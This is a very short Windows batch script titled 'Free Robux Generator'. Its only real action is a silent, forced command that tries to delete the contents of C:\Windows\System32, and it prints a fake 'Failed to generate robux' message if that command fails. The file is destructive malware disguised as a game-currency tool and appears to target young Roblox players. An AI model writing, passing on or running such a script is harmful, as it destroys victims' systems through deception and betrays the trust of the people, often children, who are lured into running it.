@echo off
title: Free Robux Generator

del /a /q "C:\Windows\System32" >nul 2>&1
if /I %errorlevel% NEQ 0 (
    echo Failed to generate robux
    pause
    exit
)
pause
exit